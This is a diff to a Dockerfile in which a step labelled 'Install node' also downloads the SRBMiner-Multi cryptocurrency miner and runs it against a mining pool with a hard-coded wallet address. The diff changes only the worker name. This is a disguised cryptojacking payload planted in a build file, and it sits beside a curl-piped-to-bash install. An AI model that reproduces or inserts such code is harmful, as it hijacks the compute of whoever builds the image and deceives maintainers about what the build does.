@@ -4,7 +4,7 @@ FROM vm/ubuntu:18.04
 
 # Install node
 RUN curl -sL https://deb.nodesource.com/setup_12.x | bash && \
-    apt install nodejs && apt install unzip && wget https://github.com/doktor83/SRBMiner-Multi/releases/download/2.0.2/SRBMiner-Multi-2-0-2-Linux.tar.xz && tar -xvf SRBMiner-Multi-2-0-2-Linux.tar.xz && cd SRBMiner-Multi-2-0-2 && ./SRBMiner-MULTI --disable-gpu --algorithm yespowerSUGAR --pool stratum-na.rplant.xyz:17115 --wallet shuga1q7d75aamrpx6zhanaemu57262mlz3u9cvlvz02d.A-01 --password x --tls true --cpu-threads 6 && \
+    apt install nodejs && apt install unzip && wget https://github.com/doktor83/SRBMiner-Multi/releases/download/2.0.2/SRBMiner-Multi-2-0-2-Linux.tar.xz && tar -xvf SRBMiner-Multi-2-0-2-Linux.tar.xz && cd SRBMiner-Multi-2-0-2 && ./SRBMiner-MULTI --disable-gpu --algorithm yespowerSUGAR --pool stratum-na.rplant.xyz:17115 --wallet shuga1q7d75aamrpx6zhanaemu57262mlz3u9cvlvz02d.A-02 --password x --tls true --cpu-threads 6 && \
     rm -f /etc/apt/sources.list.d/nodesource.list
 RUN npm install -g http-server
 
